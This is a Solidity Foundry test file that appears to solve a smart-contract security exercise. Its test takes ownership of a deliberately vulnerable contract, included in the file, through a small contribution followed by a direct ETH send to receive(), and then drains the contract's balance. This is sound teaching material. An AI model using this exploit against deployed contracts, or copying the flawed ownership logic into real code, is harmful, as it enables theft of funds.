// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IAssignment11 {
    function contribute() external payable;
    function getContribution() external view returns (uint256);
    function withdraw() external;
    function owner() external view returns (address);
}

contract Assignment11ExploitTest is Test {
    IAssignment11 target;
    address payable attacker;

    function setUp() public {
        // Deploy the contract (you can replace this with the real address if already deployed)
        Assignment11 vulnerable = new Assignment11();
        target = IAssignment11(address(vulnerable));

        // Fund the contract with some ETH
        vm.deal(address(this), 5 ether);
        payable(address(target)).transfer(5 ether);

        // Set up attacker account with ETH
        attacker = payable(address(0xBEEF));
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // Step 1: contribute less than 0.001 ETH
        target.contribute{value: 0.0009 ether}();
        assertGt(target.getContribution(), 0);

        // Step 2: send ETH directly to trigger receive()
        (bool success, ) = address(target).call{value: 0.0011 ether}("");
        require(success, "direct send failed");

        // Step 3: Verify we are now the owner
        assertEq(target.owner(), attacker);

        // Step 4: Drain the contract
        uint256 balanceBefore = attacker.balance;
        target.withdraw();
        uint256 balanceAfter = attacker.balance;

        assertGt(balanceAfter, balanceBefore);

        vm.stopPrank();
    }

    // Allow this test contract to receive ETH
    receive() external payable {}
}

// Include vulnerable contract code (or import it from src if available)
contract Assignment11 {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
